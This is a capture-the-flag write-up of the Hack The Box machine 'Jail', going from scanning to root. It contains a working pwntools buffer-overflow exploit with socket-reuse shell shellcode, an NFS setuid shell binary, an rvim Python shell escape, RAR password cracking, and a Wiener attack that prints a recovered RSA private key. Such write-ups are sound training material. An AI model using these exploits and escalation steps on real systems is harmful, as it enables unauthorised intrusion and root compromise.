# Jail
>Author : Xyan1d3
>Date : 22nd July 2021
>IP : 10.10.10.34
>OS : Linux
>Difficulty : Insane
# Initial Enumeration
## Rustscan
```sql
# Nmap 7.91 scan initiated Thu Jul 22 01:19:22 2021 as: nmap -vvv -p 22,80,111,2049,7411,20048 -A -oN nmap/rustscan 10.10.10.34
adjust_timeouts2: packet supposedly had rtt of -687134 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -687134 microseconds.  Ignoring time.
Nmap scan report for 10.10.10.34
Host is up, received reset ttl 63 (0.067s latency).
Scanned at 2021-07-22 01:19:23 IST for 181s

PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:ec:19:7c:da:dc:16:e2:a3:9d:42:f3:18:4b:e6:4d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC10JBZuYCiFDOwkbbeqZLrL1s7wXMbVZxPJOg4cW4gdpi1OvuyiWsJ09dbfCzjnUjNzA/e2RU7+LNygV2XlDPNCltWmuBQX1aBihxmK7iFMRjM12Yeg90h1kKlezc3WOv+M1YREOIKFBW7jbUiwf4z2z+tfi92d3ZN58FgAmysPaLVR/Ct+pd9AyiSJiLCEzVYWN78lQd09D33yl1MY9no85qaWr5lgnZ3YEd7kTtCXFjICiMgir3zCrZCRHHobsMH+FO3RqbOv9AHfe51rtid9UXRojgSMuzfDV19x/PwYNFMuuAhnJVFRCxXClawpILp2YuBTFJsu1juXDcqfJD/
|   256 af:94:9f:2f:21:d0:e0:1d:ae:8e:7f:1d:7b:d7:42:ef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDm08eT3joqYGfJK9t2+Bn5vXB5FHMnM7DIFVhXG3Up5XYwgxOnywl8gBGtcWtXqXNUkyqP8dApTHh9wljFH5A0=
|   256 6b:f8:dc:27:4f:1c:89:67:a4:67:c5:ed:07:53:af:97 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJLJbZLS01Zdaxy/HoDmoUF7fBBi3BhS/NW9NShcGaOs
80/tcp    open  http       syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS))
| http-methods: 
|   Supported Methods: POST OPTIONS GET HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp   open  rpcbind    syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      36938/udp6  nlockmgr
|   100021  1,3,4      37402/tcp6  nlockmgr
|   100021  1,3,4      44975/tcp   nlockmgr
|   100021  1,3,4      54909/udp   nlockmgr
|   100024  1          46672/tcp6  status
|   100024  1          48290/udp6  status
|   100024  1          48790/tcp   status
|   100024  1          50059/udp   status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl    syn-ack ttl 63 3 (RPC #100227)
7411/tcp  open  daqstream? syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    OK Ready. Send USER command.
20048/tcp open  mountd     syn-ack ttl 63 1-3 (RPC #100005)

Uptime guess: 0.006 days (since Thu Jul 22 01:13:14 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   66.41 ms 10.10.14.1
2   66.45 ms 10.10.10.34
```

## Web Enumeration
We visit the site and find out that we have a `jail` ASCII Art.
![[Pasted image 20210722012327.png]]

On doing `gobuster` we find out a webdirectory called `jailuser`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/jail]
└──╼ # gobuster dir -u http://10.10.10.34/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.34/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/22 01:21:42 Starting gobuster in directory enumeration mode
===============================================================
/jailuser             (Status: 301) [Size: 236] [--> http://10.10.10.34/jailuser/]
```

We visit the directory and find out some `c` files and `binaries`.
![[Pasted image 20210722012455.png]]
We could download the files onto our box.

We have `compile.sh` which compiles `jail.c` to make the `jail` binary which is vulnerable to buffer overflow attack.
![[Pasted image 20210722012939.png]]
The code also discloses that it expects username : `admin` and password : `1974jailbreak!` to turn on debug mode on.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/jail/jailuser]
└──╼ # nc 10.10.10.34 7411
OK Ready. Send USER command.
DEBUG
OK DEBUG mode on.
USER admin
OK Send PASS command.
PASS 1974jailbreak!
Debug: userpass buffer @ 0xffffd610
OK Authentication success. Send command
```

We see that we get a `SEGFAULT` when username is `admin` and password is somthing big.
![[Pasted image 20210722014343.png]]

We get the offset from getting the data in `$eip`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/jail]
└──╼ # msf-pattern_offset -q 62413961
[*] Exact match at offset 28
```

The box has a firewall which would not allow us to get a shell by using a classic reverse shell using `msfvenom`.
We have to us an socket reuse payload.

The BoF Exploit.
```python
from pwn import *
context(os="linux", arch="i386")
host = "10.10.10.34"
port = "7411"
junk = "A" * 28
memory_add = p32(0xffffd610 + 32)
buf = ""
buf += "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
buf += "\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
buf += "\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
buf += "\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
buf += "\x89\xe3\x31\xc9\xcd\x80"
p = remote(host,port)
p.recvuntil("OK Ready. Send USER command.")
p.sendline("DEBUG")
p.recvuntil("OK DEBUG mode on.")
p.sendline("USER admin")
p.recvuntil("OK Send PASS command.")
p.sendline("PASS " + junk + memory_add +  buf)
p.interactive()
```

# Initial FootHold on the box as nobody
We use the BoF exploit and get a shell on the box as `nobody`.
![[Pasted image 20210722020542.png]]


We have some `nfs` shares which we can mount on this box.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/jail]
└──╼ # showmount -e 10.10.10.34
Export list for 10.10.10.34:
/opt          *
/var/nfsshare *
```

We could get down to uid `1000` user and create a suid file and on executing it on target we will be able to elevate our privileges.

# User Escalation to Frank
```python
magisk@Xyan1d3:/mnt$ nano suid.c
magisk@Xyan1d3:/mnt$ cat suid.c
#include<stdio.h>
int main()
{
setreuid(1000,1000);
printf("Suid Bashing\n");
system("/bin/sh");
}
magisk@Xyan1d3:/mnt$ gcc -o suid suid.c
suid.c: In function ‘main’:
suid.c:4:1: warning: implicit declaration of function ‘setreuid’ [-Wimplicit-function-declaration]
    4 | setreuid(1000,1000);
      | ^~~~~~~~
suid.c:6:1: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    6 | system("/bin/sh");
      | ^~~~~~
magisk@Xyan1d3:/mnt$ chmod +s suid
```

Now, We execute the file and get our privileges elevated to `frank`
```python
bash-4.2$ $ id
id
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
bash-4.2$ $ /var/nfsshare/suid
/var/nfsshare/suid
Suid Bashing
sh-4.2$ $ id
id
uid=1000(frank) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```

We can drop an `SSH` key in the `authorized_keys` and get a proper shell into the box.

# Getting the user Flag
```python
-bash-4.2$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
-bash-4.2$ whoami
frank
-bash-4.2$ ls -l
total 4
drwxr-x---. 2 frank frank 26 Jun 26  2017 bin
drwxr-xr-x. 2 frank frank  6 Jun 25  2017 Desktop
drwxr-xr-x. 2 frank frank  6 Jun 25  2017 Documents
drwxr-xr-x. 2 frank frank  6 Jun 25  2017 Downloads
drwxr-x---. 2 frank frank 27 Jun 26  2017 logs
drwxr-xr-x. 2 frank frank  6 Jun 25  2017 Music
drwxr-xr-x. 2 frank frank  6 Jun 25  2017 Pictures
drwxr-xr-x. 2 frank frank  6 Jun 25  2017 Public
drwxr-xr-x. 2 frank frank  6 Jun 25  2017 Templates
-r--------. 1 frank frank 33 Jul 21 12:38 user.txt
drwxr-xr-x. 2 frank frank  6 Jun 25  2017 Videos
-bash-4.2$ cat user.txt 
caddf25898e28d8e12db9a65e5c9af5b
```

# User Escalation to adm
We see that we have a have `sudo NOPASSWD` rule on us which we can abuse.
We use this payload in the `rvim` command mode.
```
:py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
```

We get escalated to the `adm` user.
```python
sh-4.2$ id
uid=3(adm) gid=4(adm) groups=4(adm) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2$ whoami
adm
```

# Root Escalation
We see that here we have a `rar` file and a `note.txt`.
```python
sh-4.2$ ls -la
total 8
drwxr-x---. 3 root adm  52 Jul  3  2017 .
drwxr-x---. 3 root adm  19 Jul  3  2017 ..
-rw-r-----. 1 root adm 475 Jul  3  2017 keys.rar
drwxr-x---. 2 root adm  20 Jul  3  2017 .local
-rw-r-----. 1 root adm 154 Jul  3  2017 note.txt
sh-4.2$ cat note.txt 
Note from Administrator:
Frank, for the last time, your password for anything encrypted must be your last name followed by a 4 digit number and a symbol.
```

Unfortunately, The `rar` file is encrypted.
As from the theme of the box it is clear that we are talking about the `Great Prison Escape` from `Alcatraz`.

We also have a file which contains a junk.
```python
sh-4.2$ ls -la
total 8
drwxr-x---. 3 root adm  52 Jul  3  2017 .
drwxr-x---. 3 root adm  19 Jul  3  2017 ..
-rw-r-----. 1 root adm 475 Jul  3  2017 keys.rar
drwxr-x---. 2 root adm  20 Jul  3  2017 .local
-rw-r-----. 1 root adm 154 Jul  3  2017 note.txt
sh-4.2$ cd .local
sh-4.2$ ls -la
total 4
drwxr-x---. 2 root adm  20 Jul  3  2017 .
drwxr-x---. 3 root adm  52 Jul  3  2017 ..
-rw-r-----. 1 root adm 113 Jul  3  2017 .frank
sh-4.2$ cat .frank 
Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!
```

We find out that it is an AtBash Cipher which we decode.
![[Pasted image 20210722025045.png]]

The person reffered here is `Frank Morris`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/jail]
└──╼ # cat wordlist_gen.py 
import string

for each in range(1950,2000):
        for each2 in string.punctuation:
                print(f"Morris{each}{each2}")
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/jail]
└──╼ # python3 wordlist_gen.py  > wordlist
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/jail]
└──╼ # john rar.hash -w=wordlist
Using default input encoding: UTF-8
Loaded 1 password hash (rar, RAR3 [SHA1 128/128 SSE2 4x AES])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Morris1962!      (keys.rar)
1g 0:00:00:09 DONE (2021-07-22 03:04) 0.1060g/s 44.11p/s 44.11c/s 44.11C/s Morris1956;..Morris1962~
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We get the password of `Morris1962!`.
We could now extract the rar file.
```python
─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/jail/rar]
└──╼ # unrar x keys.rar 

UNRAR 6.00 freeware      Copyright (c) 1993-2020 Alexander Roshal


Extracting from keys.rar

Enter password (will not be echoed) for rootauthorizedsshkey.pub: 

Extracting  rootauthorizedsshkey.pub                                  OK 
All OK
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/jail/rar]
└──╼ # ls -l
total 8
-rw-r--r-- 1 root root 475 Jul 22 02:41 keys.rar
-rw-r--r-- 1 root root 451 Jul  3  2017 rootauthorizedsshkey.pub
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/jail/rar]
└──╼ # cat rootauthorizedsshkey.pub 
-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQYHLL65S3kVbhZ6kJnpf072
YPH4Clvxj/41tzMVp/O3PCRVkDK/CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//
DmcIo1pJGKy8LDrwdpsSjVmvSgg39nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6Pd
D/qlaFM8B87MHZlW1fqe6QKBgQVY7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/w
Wt2/7A1Xgi5ckTFMG5EXhfv67GfCFE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAx
I85LArqOGc6QoVPS7jx5h5bK/3Oqm3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFug
a99GCw==
-----END PUBLIC KEY-----
```

We have a very small `RSA` Public Key which looks to be very weak. From this `Public Key` we may be able to get the `Private Key` back.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/jail]
└──╼ # /opt/RsaCtfTool/RsaCtfTool.py --publickey rar/rootauthorizedsshkey.pub --private

[*] Testing key rar/rootauthorizedsshkey.pub.
*** SNIP ***
[*] Performing wiener attack on rar/rootauthorizedsshkey.pub.
[*] Attack success with wiener method !

Results for rar/rootauthorizedsshkey.pub:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICOgIBAAKBgQYHLL65S3kVbhZ6kJnpf072YPH4Clvxj/41tzMVp/O3PCRVkDK/
CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//DmcIo1pJGKy8LDrwdpsSjVmvSgg3
9nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6PdD/qlaFM8B87MHZlW1fqe6QKBgQVY
7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/wWt2/7A1Xgi5ckTFMG5EXhfv67GfC
FE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAxI85LArqOGc6QoVPS7jx5h5bK/3Oq
m3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFuga99GCwIgCMdb8cTpq+uOUyIK2Jrg
PNxrCGF8HNhw8qT9jCez3aMCQQHBKGne1ibAwbqvPTd91cBUKfFYYIAY9a6/Iy56
XnGBS35kpKZB7j5dMZxxOwPDowgZr9aGNAzcFAeCaP5jj3DhAkEDb4p9D5gqgSOc
NXdU4KxzvZeBQn3IUyDbJ0J4pniHZzrYq9c6MiT1Z9KHfMkYGozyMd16Qyx4/Isf
bc51aYmHCQIgCMdb8cTpq+uOUyIK2JrgPNxrCGF8HNhw8qT9jCez3aMCIAjHW/HE
6avrjlMiCtia4DzcawhhfBzYcPKk/Ywns92jAkEBZ7eXqfWhxUbK7HsKf9IkmRRi
hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q==
-----END RSA PRIVATE KEY-----
```

We can `SSH` into `root` with that private key.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/jail]
└──╼ # ssh -i root.pem root@10.10.10.34
[root@localhost ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@localhost ~]# whoami
root
```
![[Pasted image 20210722032846.png]]

## Getting the root Flag
```python
[root@localhost ~]# ls -l
total 4
-r--------. 1 root root 33 Jul 21 12:38 root.txt
[root@localhost ~]# cat root.txt 
d64cc7c2a5af09796227420ab354b91b
```